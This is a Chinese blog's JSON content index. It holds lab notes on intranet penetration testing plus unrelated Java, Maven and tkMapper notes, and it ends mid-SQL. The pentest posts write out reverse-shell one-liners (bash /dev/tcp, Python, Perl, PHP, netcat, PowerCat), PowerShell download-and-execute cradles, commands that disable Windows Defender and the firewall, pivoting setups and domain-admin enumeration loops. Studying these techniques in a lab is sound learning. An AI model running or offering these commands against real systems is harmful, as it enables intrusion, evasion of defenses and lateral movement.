{"meta":{"title":"BigBug","subtitle":"BigBugの博客","description":"博客因兴趣诞生,在不断完善中","author":"BigBug","url":"https://bigbug888.github.io","root":"/"},"pages":[{"title":"分类","date":"2020-11-24T07:12:19.000Z","updated":"2021-11-24T04:36:06.194Z","comments":false,"path":"categories/index.html","permalink":"https://bigbug888.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于本站","date":"2020-04-19T04:58:56.000Z","updated":"2021-11-23T17:59:21.609Z","comments":false,"path":"about/index.html","permalink":"https://bigbug888.github.io/about/index.html","excerpt":"","text":"仙气の云彩“ 认识自我、超越自我 “ 那么你离成功就又进了一步！ 当你在项目中感觉所要学习的人和事越来越多时，说明你在 成长 。 当你感觉要责怪的人和事越来越少时，说明你在 成熟 。 当你在项目中不断获得了友谊和朋友时，说明你将取得项目的 成功 。 联系我B站：BigBug（萌新up） QQ：1211589590 （嘀嘀~，麻烦让一下，我要开车了！） 座右铭：既然选择了远方 便只顾风雨兼程"},{"title":"我的歌单","date":"2019-05-17T08:14:00.000Z","updated":"2021-07-26T13:06:52.537Z","comments":true,"path":"music/index.html","permalink":"https://bigbug888.github.io/music/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-06-27T12:40:24.587Z","comments":true,"path":"archives/index.html","permalink":"https://bigbug888.github.io/archives/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-07T14:17:49.000Z","updated":"2021-07-27T07:31:10.990Z","comments":true,"path":"link/index.html","permalink":"https://bigbug888.github.io/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-11-24T07:14:39.000Z","updated":"2021-07-26T14:44:42.337Z","comments":false,"path":"tags/index.html","permalink":"https://bigbug888.github.io/tags/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-23T15:05:37.940Z","updated":"2021-10-14T02:13:24.113Z","comments":false,"path":"List/gallery/index.html","permalink":"https://bigbug888.github.io/List/gallery/index.html","excerpt":"","text":"壁紙 世俗的欲望 OH MY GIRL 關於OH MY GIRL的圖片"},{"title":"","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-23T17:03:45.509Z","comments":false,"path":"List/movies/index.html","permalink":"https://bigbug888.github.io/List/movies/index.html","excerpt":"","text":"励志视频"},{"title":"","date":"2021-09-28T14:56:14.000Z","updated":"2021-09-28T16:44:43.445Z","comments":false,"path":"List/gallery/ohmygirl/index.html","permalink":"https://bigbug888.github.io/List/gallery/ohmygirl/index.html","excerpt":"","text":""},{"title":"留言板","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-23T10:50:01.880Z","comments":false,"path":"comments/index.html","permalink":"https://bigbug888.github.io/comments/index.html","excerpt":"","text":""},{"title":"Music-BBOX","date":"2020-04-23T04:58:56.000Z","updated":"2021-11-23T18:31:29.836Z","comments":false,"path":"List/music/index.html","permalink":"https://bigbug888.github.io/List/music/index.html","excerpt":"","text":""},{"title":"","date":"2021-09-28T14:56:13.000Z","updated":"2021-10-14T02:11:35.135Z","comments":false,"path":"List/gallery/wallpaper/index.html","permalink":"https://bigbug888.github.io/List/gallery/wallpaper/index.html","excerpt":"","text":""}],"posts":[{"title":"PowerCat&&SSH使用","slug":"内网06powercat&&ssh","date":"2021-11-30T14:11:12.000Z","updated":"2021-12-03T17:40:50.695Z","comments":true,"path":"posts/19.html","link":"","permalink":"https://bigbug888.github.io/posts/19.html","excerpt":"","text":"powercatPowerCat:windows下面的vc，是一个ps1脚本，windows下面的工具 PowerCat与netcat命令功能相似，可以相互连接，其中PowerCat可以返回powershell，而netcat不支持 导入PowerCatpowershell #进入powershell命令行 Set-ExecutionPolicy RemoteSigned #设置允许执行本地powershell脚本 Import-Module ./PowerCat.ps1 PowerCat -h nc正向连接PowerCat 在win7上执行命令，开始监听：PowerCat -l -p 4444 -e c:\\windows\\system32\\cmd.exe -v 在kali上执行命令，连接win7端口获得cmd命令行：nc 192.168.114.7 4444 -vv ipconfig验证 反向连接PowerCat在kali上执行命令监听：nc -l -p 4444 -vv 在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -e cmd.exe 其中端口是边界kali的 通过PowerCat反弹powershell在边界kali上执行命令监听：nc -l -p 4444 -vv开始监听 在win7中执行命令：PowerCat -c 192.168.114.10 -p 4444 -v -ep win12和win7通过powercat连接win7反弹win12，win12监听端口，win7让他主动去连接 win7： powercat -l -v -p 899 win12: powercat -c 192.168.114.12 -p 889 -v -ep 反过来 win7中 win2016 以上是powercat获取shell方式 通过PowerCat与nc传输文件在kali上执行命令监听：nc -l -p 5566 &gt; test.txt开始监听，并把传输的内容写入到test.txt中 在win7中执行命令：PowerCat -c 192.168.83.100 -p 4444 -i C:\\PowerCat-master\\README.md -v 两个内网机子进行文件传输win7： powercat -l -v -p 3333 -of c:\\1.txt win16 powercat -c 192.168.114.7 -p 3333 -i c:\\2.txt -v 使用PowerCat作为跳板靶机监听：PowerCat -l -v -p 6666 -e cmd.exe 跳板机监听：PowerCat -l -v -p 4444 -r tcp:192.168.83.91:6666 这样，当访问跳板机的4444端口时，就会把流量转发给靶机（192.168.83.91）的6666端口中了 原理 以win16为跳板，通过16获得win7的shell 边界kali连接跳板机win16 win7： powercat -l -v -p 6767 -e c:\\windows\\system32\\cmd.exe win16:powercat -l -v -p 8888 -r tcp:192.168.114.7:6767 边界kali： nc 192.168.114.12 8888 -vv 若失败的话，则win7和win16反过来试试 ping边界kali，通了 SSH 本地端口转发原理 先修改两个kali中的ssh配置文件： vim /etc/ssh/sshd_config 保证这五个是yes 改完记得重启服务：service ssh restart 或者/etc/init/ssh restart(这个好像没啥用) vps kali中 ssh –CfNg –L 2222:192.168.114.7:3389 root@192.168.43.21 win7的3389转发到2222 ssh远程转发原理： ssh –CfNg –L 2222（vps）:192.168.63.8:3389 root@192.168.3.19 物理机访问： 192.168.43.19:3389 动态转发建立sock4/5代理通道 原理 vps kali中： ssh –CfNg –D 5000 root@192.168.43.21 再输入密码 确认代理是否开启可以查看端口库：netstat -ant 再开win7中的phpstudy 物理机浏览器输入，首先手动配置代理192.168.43.21 5000 浏览器访问192.168.114.7 vps中： vim /etc/proxychains.conf 写入socks5： 192.168.43.21 5000 保存 如果要访问它： proxychains curl 192.168.150.7","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"NECAT使用","slug":"内网05netcat使用","date":"2021-11-29T18:01:12.000Z","updated":"2021-11-29T20:18:47.386Z","comments":true,"path":"posts/18.html","link":"","permalink":"https://bigbug888.github.io/posts/18.html","excerpt":"","text":"NECAT使用 natcat用途banner抓取，远程连接主机，端口扫描，端口监听，文件传输，简易聊天，获取shell，内网代理等等 banner抓取边界kali中，输入nc回车—-》再去看看win7中端口有哪些开了：netstat -ano banner抓取，边界kali中，输入nc -nv 192.168.114.7（win7） 80(端口) 连接远程主机：nc -nvv win7ip 端口 端口扫描 扫描80-8000端口段 kali集成的namp扫 端口监听vps的kali中先输入：nc -lvp 5555 边界kali：nc 192.168.43.19 5555 -e/bin/sh 其中ip和端口按照实际更改 文件传输vps kali中：cd /tmp ls rm -rf * ls vim 1.txt ls nc -lvp 6666 &gt; 1.txt:把监听到6666传到1.txt 边界kali中： cd /tmp ls rm -rf * ls vim 2.txt 随便写点东西 nc -nv 192.168.43.19 6666 &lt; 2.txt vps kali中再开一个窗口：cd /tmp ls cat 1.txt 查看1.txt文件内容 以上是2.txt写入到1.txt，若&gt;，&lt;反过来的话则是1写入2 vpskali中： nc -lvp 7777 &lt; 1.txt 边界kali：nc -nv 192,168.43.19 7777 &gt; 2.txt 访问7777，并且放入2.txt cd /tmp ls cat 2.txt 聊天vps kali中： nc -lvp 8888 边界kali： nc -nv 192.168.43.19 建立连接 正向获取shell边界kali：nc -lvp 4444 -e /bin/sh 把shell放到了4444端口，等着别人来执行 vpskali中：nc 192.168.43.21 4444 新开窗口ifconfig 正向 win7中，放好nc.exe--&gt;cmd nc -lsp 3333 -e c:\\windows\\system\\cmd.exe 边界kali: nc 192.168.114.7 3333 ifconfig 反向vps kali中：nc -lvp 999 边界kali：nc 192.168.43.19 999 -e /bin/sh vps kali中ifconfig vps kali中：nc -lvp 555 边界kali：bash -i 》&amp; /dev/tcp/192.168.43.19/555 0 &gt; &amp; 1 报错 反过来： 边界kali： nc -lvp 444 vps kali中: bash -i 》&amp; /dev/tcp/192.168.43.19/444 0 &gt; &amp; 1 报错 此时，去ubuntu中实验 ubuntu中：ping 192.168.43.19 成功 vpskali中：nc -lvp 222 ubuntu：bash -i 》&amp; /dev/tcp/192.168.43.19/222 0 &gt; &amp; 1 去vpskali中看效果：成功 ubuntu中输入nc，发现没有集成nc，故可以bash -i反弹shell python脚本反弹shell物理机器来监听端口库，找到nc.exe，cmd： nc -lvp 999 vps kali中，复制下面的python代码，其中ip和物理机一样，端口为上面的一样 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.43.158\",889));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' perl反弹shell物理机：nc.exe-》cmd nc -lvp 999 vps kali中 复制下面代码 用whoami验证 perl -e 'use Socket;$i=\"192.168.43.158\";$p=998;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' PHP反弹shell物理机： nc -lvp 999 kali: 下列php代码 php -r '$sock=fsockopen(\"192.168.43.158\",789);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 以上4中都是反向shell 接下来是nc搭建内网代理将kali当代理，vps可以访问到win16 vps kali中 : nc -lvp 1111 win7中： nc -lvp 6666 -e c:\\windows\\system32\\cmd.exe 边界kali： nc -v 192.168.43.19 1111 -v \"nc -v 192.168.114.7 6666\" vps中验证 ifconfig 变成了192，168.114.7 成功 正常ping 192.168.114.7是连不通的","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"域内信息收集+icmp隧道","slug":"内网04域内信息收集+icmp隧道","date":"2021-11-29T16:18:31.000Z","updated":"2021-11-29T20:20:34.350Z","comments":true,"path":"posts/17.html","link":"","permalink":"https://bigbug888.github.io/posts/17.html","excerpt":"","text":"域内信息收集+icmp隧道neo4j 初始化username&amp;password都是neo4j username:neo4j,密码是刚刚在7474端口设置的密码 首先查看vpskali的ip 接下来编辑ip使用vim /etc/network/interfaces回车，其中：auto表示开机自启，lo代表本地127的那个网卡，iface eth0 inet static表示配dhcp是动态还是静态，此处为静态，getway表示防火墙的网关，kali中是eth0，centos7是ens33 桥接模式 同理配置边界kali 一个桥接一个主机模式 防火墙monowall: 2-》改lan：192.168.114.6-》24位：输入24-》n-》5-》y，此时lan的ip改为了局域网中的ip了在真机中的浏览器输入192.168.114.6，用户名admin，密码monowan：ipaddress只能在浏览器中改，网关：看真机的默认网关，保持一致—》ping 边界192.168.43.21 —》ping 域控192.168.114.12 mono，弹窗登录，用户名：admin，密码：mono。其中gateway和真机的网关一样 真机的网关 删除域控：管理角色-&gt;删除-&gt;下一步到activite directory,点中-&gt;删除功能-&gt;出现验证结果，因为之前升级了，故这里降级 win7中，控制面板中查看计算机名称-》更改设置，将域切换到工作组（随便写名字）-》确定-》输入用户名和密码 去vps中 ping192.168.168.43.21 可通 去边界kali中 ping192.168.43.19可通 边界kali中 ping 192.168.114.12 win16 可通 边界kali中 ping 192.168.114.7 win7 可通 搭建隧道：通过一个协议去传递另一个协议，搭建icmp隧道，要保证相互ping通vpskali中 win2016中","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"域内信息收集","slug":"内网03域内信息收集","date":"2021-11-22T13:00:01.000Z","updated":"2021-12-01T02:14:41.117Z","comments":true,"path":"posts/16.html","link":"","permalink":"https://bigbug888.github.io/posts/16.html","excerpt":"","text":"域内信息收集域内基础信息Net view /domain 查看域 Net view /domain:xxx 查看xxx域内所有主机 Net group /domain 查看用户组列表 Net group “Domain Admins” /domain 查询域管理员列表 Net accounts /domain 查看域用户密码策略 Nltest /domain_trusts 查看域信任信息 遇到6118错误，可能是防火墙没有关闭或者server，workstation，computer browser未开启 域控制器的查找Nltest /DCLIST:XXX 查看域控制器的名称 Nslookup –type=SRV _ldap._tcp Net time /domain 查看域时间 Net group “domain controllers” /domain 查看所有域控制器 Netdom query pdc 查找域控制器 域内用户和管理员的获取查询所有域用户列表 Net user /domain 查看域用户列表 Wmic useraccount get /all 获取域内用户详细信息 Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息 Net localgroup administrators /domain 查看administrators组内所有用户 查询域管理员用户组 Net group “domain admins” /domain Net group “Enterprise Admins” /domain 注意：这些域命令需要域权限（域用户）和system权限才能执行 定位域管理员wevtuil导出日志 会话 1，定位域管理员工具 Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资 源登录的用户 PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户（注意：需要安装.net框架才可以） Netsess.exe 查主机会话的工具 Nmap 的NSE脚本 Powerview 脚本-Invoke-UserHunter Powershell.exe –exec bypass –Command “&amp; {Import-Module C:\\PowerView.ps1; Invoke-UserHunter}” 查看域管理进程 本机检查 获取域管理员列表 net group “domain admins” /domain ⚫ 查看本机所有进程 Tasklist /v ⚫ 交叉(当前域有多少个管理员，本机所有进程有那些是域管理员运行的)域管理员 进程,然后模拟域管理进程从而获取域管理员权限 查询域管理进程 1，收集域控制器的列表 net group “domain controllers” /domain 2，收集域管理员的列表 net group “domain admins” /domain 3，使用netsess.exe查询每个域控制器，收集所有活动域会话的列表。 netsess.exe –h（查询主机会话） 4，将域管理员列表与活动会话列表交叉引用，以确定哪些ip地址具有活动域令牌 FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a 3. 扫描远程系统上的运行任务 收集域管理员的列表 net group “domain admins” /domain &gt; admins.txt net group “domain controllers” /domain &gt; dcs.txt FOR /F %i in (dcs.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause powershell优点：不会占用内存，不用写入到磁盘中去，需要用到.net框架 Powershell –exec bypass “import-module ./powerview.ps1;get-netdomain 上面情况估计是中文路径的锅","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"内网信息收集","slug":"内网02内网信息收集","date":"2021-11-19T15:00:00.000Z","updated":"2021-11-26T03:54:56.058Z","comments":true,"path":"posts/3.html","link":"","permalink":"https://bigbug888.github.io/posts/3.html","excerpt":"","text":"内网信息收集工作组信息收集内网信息收集 查询网络配置：ipconfig /all 查询用户列表： 查询进程列表：tasklist /v 和 wmic process list brief 查询操作系统以及安装软件版本信息 获取操作系统和版本信息 查看安装软件以及版本，路径 查询端口列表 查询补丁列表 查询本机共享 查询防火墙相关配置 ​ 1，关闭防火墙 A，windows server 2003系统及以前版本 Netsh firewall set opmode disable ​ B，windows server 2003 之后系统版本 Netsh advfirewall set allprofiles state off/on ​ 2，查看防火墙配置 Netsh firewall show config 查询并且开启远程连接服务 查询并开启远程连接服务 查看远程连接端口号 Reg query “hkey_local_machine\\system\\currentcontrolset\\control\\terminal server\\winstations\\RDP-Tcp” /v portnumber 查看3389是否开启 Netstat –ano | findstr “3389” 开启远程连接服务 Windows server 2008和windows server 2016开启3389的方法 1, wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1 2, wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1 3, reg add “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限需要 查看当前权限 whoami（本地普通用户，域内用户bigbug888/administrator,whoami /all Net user bigbug888/domain 域内信息收集 判断是否有域 Iipconfig /all 和Systeminfo WORKGROUP 和Net config workstation 和Net time /domain 域内存活主机探测 利用netbios快速探测内网（网络邻居协议，优先） 工具：nbtscan 遇到win2016杀毒软件windows defender关不掉可在管理员cmd下输入（如果还是关不掉可以重启，可能是虚拟机没反应过来） reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD 使用vbs脚本 Cscript 1.vbs 利用arp扫描完整探测内网， arp-scan 命令 apr.exe -t ip arp.exe -t 192,168,5.0/24 empire中的arpscan模块 invoke-arpscan.ps1 ps命令： 远程下载运行：powershell –nop –exec bypass –c “IEX（new-Object net.webClient）.DownloadString(‘http://192.168.1.1/invoke-arpscan.ps1’);invoke-arpscan –CIDR 192.168.1.0/24”&gt;&gt;c:\\windows\\temp\\log.txt 本地运行：powershell.exe -exec bypass -Command \"Import-Module ./Invoke\u0002ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.5.0/24” 利用常规的tcp/udp端口扫描探测内网 工具：scanline 命令： sl –h –t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 –u 53,161,137,139 –o c:\\windows\\temp\\sl_res.txt –p 192.168.5.1-254 /b 域内端口扫描（注：扫描的时候要注意是否会触发IDS等安全设备警告） 端口的banner信息 端口上运行的服务 常见应用的默认端口 telnet命令 命令：telnet ip端口 Nmap工具扫描 Metasploit模块 search portscan invoke-portscan.ps1 powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,80,8080,3389' -oA c:\\ProgramData\\ip_info\" ​ 域内基础信息收集： Net view /domain 查看域 Net view /domain:xxx 查看xxx域内所有主机 Net group /domain 查看用户组列表 Net group “Domain Admins” /domain 查询域管理员列表 Net accounts /domain 查看域用户密码策略 Nltest /domain_trusts 查看域信任信息 注意：这些域命令需要域权限（域用户）或system权限才能执行 ​ ​ 域控制器的查找 Nltest /DCLIST:XXX 查看域控制器的名称 Nslookup –type=SRV _ldap._tcp Net time /domain 查看域时间 Net group “domain controllers” /domain 查看所有域控制器 Netdom query pdc 查找域控制器 ​ 域内用户和管理员的获取 查询所有域用户列表 Net user /domain 查看域用户列表 Wmic useraccount get /all 获取域内用户详细信息 Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息 Net localgroup administrators /domain 查看administrators组内所有用户 ​ 域内用户和管理员的获取 查询域管理员用户组 Net group “domain admins” /domain Net group “Enterprise Admins” /domain ​ 定位域管理员 ​ 常规的定位域管理员的方法： ​ 1.日志（指的是本地机器的管理员日志，可以使用脚本或者wevtutil导出查看） ​ 2.会话（是域内每个机器的登录绘画，可以匿名查询，无需权限，可以使用netsess.exe或者powerview等工具查询） ​ 常规定位域管理员的方法 ​ 1.定位管理员工具 ​ 2.查询域管理进程 ​ 3.模拟域管理员 1，定位域管理员工具 Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资 源登录的用户 PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户 Netsess.exe 查主机会话的工具 Nmap 的NSE脚本 Powerview 脚本-Invoke-UserHunter Powershell.exe –exec bypass –Command “&amp; {Import-Module C:\\PowerView.ps1; Invoke-UserHunter}” 查询域管理进程 本机检查 获取域管理员列表 查看本机所有进程 交叉 查询域控制器的域用户会话 收集域控制器的列表 收集域管理员的列表 使用netsess.exe查询每个域控制器 将域管理员列表与活动会话列表交叉引用 扫描远程系统的运行任务 收集域管理员的列表 net group \"Domain Admins\" /domain &gt; admins.txt net group \"Domain Controllers\" /domain &gt; dcs.txt for /F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr/I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i使用nbtscan工具，就文件与该工具置于同一目录下for /F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr/I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"内网环境搭建1","slug":"内网01内网渗透环境搭建1","date":"2021-11-17T17:00:00.000Z","updated":"2021-11-26T03:54:37.637Z","comments":true,"path":"posts/2.html","link":"","permalink":"https://bigbug888.github.io/posts/2.html","excerpt":"","text":"1.windows server 2016管理-&gt;添加新角色 2.安装域控制器和dns服务勾选active directory域服务器，dns服务器 3.设置ip 4.更改计算机名字 5.升级服务器（升级为域控）遇到下面这种情况是因为电脑管理员密码没有设置 6.创建active directory用户然后使用win7加入该域","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"Maven聚合工程","slug":"04-锋迷商城-随堂笔记/02-Maven/Maven聚合工程","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:17:24.752Z","comments":true,"path":"posts/10.html","link":"","permalink":"https://bigbug888.github.io/posts/10.html","excerpt":"","text":"Maven聚合工程1 Maven聚合工程概念 Maven聚合工程：就是可以在一个Maven父工程中创建多个组件(项目)，这个多个组件之间可以相互依赖，实现组件的复用 2 创建Maven聚合工程2.1 创建Maven父工程 Maven聚合工程的父工程 packing必须为 pom 创建一个Maven工程 修改父工程的pom.xml，设置打包方式为pom &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 父工程用于管理子工程，不进行业务实现，因此src目录可以选择性删除 2.2 创建Module 选择父工程—右键—New—Module 输入子工程名称（g和v都从父工程继承） 子工程的pom文件： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;!--module的pom继承 父工程的pom--&gt; &lt;parent&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;/project&gt; 父工程的pom文件： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;!-- 声明当前父工程的子module --&gt; &lt;modules&gt; &lt;module&gt;common&lt;/module&gt; &lt;/modules&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 3 Maven聚合工程依赖继承3.1 依赖继承 在父工程的pom文件添加的依赖，会被子工程继承 3.2 依赖版本管理 在父工程的pom.xml的dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本（此定义并不会让子工程中添加当前依赖） &lt;!-- 依赖管理：在dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本 --&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt;","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"tkmapper","slug":"04-锋迷商城-随堂笔记/03-tkMapper/tkMapper","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:18:08.811Z","comments":true,"path":"posts/11.html","link":"","permalink":"https://bigbug888.github.io/posts/11.html","excerpt":"","text":"一、 DAO层的实现的规律 实体类与数据表存在对应关系，并且是有规律的——只要知道了数据表的结构，就能够生成实体类； 所有实体的DAO接口中定义的方法也是有规律的，不同点就是实体类型不同 UserDAO public interface UserDAO extends GeneralDAO&lt;User&gt;{ public int insert(User t); } GoodsDAO public interface GoodsDAO extends GeneralDAO&lt;Goods&gt; { public int insert(Goods t); } GeneralDAO public interface GeneralDAO&lt;T&gt;{ //通用方法 public int insert(T t); public T queryOneByPrimarykey(int i); } 对于GeneralDAO接口定义的数据库操作方法因为使用了泛型，无需映射文件；对于UserDAO和GoodsDAO需要映射文件，所有DAO的相同操作的映射文件也是有规律可循的 UserMapper &lt;insert id=\"insert\"&gt; insert into users(user_id,username) values(#{userId},#{username}) &lt;/insert&gt; @Table(\"users\") public class User{ @Id @Column(\"user_id\") private int userId; @Column(\"username\") private String username; } GoodsMapper &lt;insert id=\"insert\"&gt; insert into goods(goods_id,goods_name) values(#{goodsId},#{goodsName}) &lt;/insert&gt; @Table(\"product\") public class Goods{ @Id @Column(\"goods_id\") private int goodsId; @Column(\"goods_name\") private String goodsName; } 二、tkMapper简介 基于MyBatis提供了很多第三方插件，这些插件通常可以完成数据操作方法的封装（GeneralDAO）、数据库逆向工程工作(根据数据表生成实体类、生成映射文件) MyBatis-plus tkMapper tkMapper就是一个MyBatis插件，是在MyBatis的基础上提供了很多工具，让开发变得简单，提高开发效率。 提供了针对单表通用的数据库操作方法 逆向工程（根据数据表生成实体类、dao接口、映射文件） 三、tkMapper整合3.1 基于SpringBoot完成MyBatis的整合3.2 整合tkMapper3.2.1 添加tkMapper的依赖&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.5&lt;/version&gt; &lt;/dependency&gt; 3.2.2 修改启动类的@MapperScan注解的包 为tk.mybatis.spring.annotation.MapperScan import tk.mybatis.spring.annotation.MapperScan; @SpringBootApplication @MapperScan(\"com.qfedu.tkmapperdemo.dao\") public class TkmapperDemoApplication { public static void main(String[] args) { SpringApplication.run(TkmapperDemoApplication.class, args); } } 四、tkMapper使用4.1 创建数据表CREATE TABLE `users` ( `user_id` int(64) NOT NULL AUTO_INCREMENT COMMENT '主键id 用户id', `username` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名 用户名', `password` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码 密码', `nickname` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 